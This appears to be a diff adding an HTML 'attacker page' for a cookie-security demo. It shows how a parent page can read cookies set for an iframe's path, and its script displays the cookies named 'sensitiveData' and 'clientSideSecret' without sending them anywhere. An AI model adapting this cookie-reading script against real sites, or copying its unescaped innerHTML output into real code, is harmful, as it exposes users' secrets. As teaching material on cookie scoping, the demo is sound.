@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Security Demo - Attacker Page</title>
+    <style>
+        iframe {
+            width: 100%;
+            height: 200px;
+            border: 1px solid #ccc;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+        }
+        .stolen {
+            color: #d63031;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>Cookie Security Demo - Parent Page</h1>
+    <p>This page demonstrates how cookies can be stolen from an iframe when only using Path attribute.</p>
+    
+    <h3>Vulnerable iframe:</h3>
+    <iframe src="/frame-path-attack/vulnerable-page"></iframe>
+    
+    <div class="result">
+        <h3>Stolen Cookies:</h3>
+        <pre id="cookieDisplay"></pre>
+    </div>
+
+    <script>
+        function extractCookies() {
+            const cookies = document.cookie.split(';');
+            const stolenCookies = cookies.filter(cookie => {
+                const [name] = cookie.trim().split('=');
+                return name === 'sensitiveData' || name === 'clientSideSecret';
+            });
+            
+            document.getElementById('cookieDisplay').innerHTML = stolenCookies.length ? 
+                `<span class="stolen">${stolenCookies.join('\n')}</span>` : 
+                'No cookies accessed yet... (try refreshing the page)';
+        }
+
+        // Check for cookies periodically
+        setInterval(extractCookies, 1000);
+        
+        // Also check immediately
+        extractCookies();
+    </script>
+</body>
+</html>
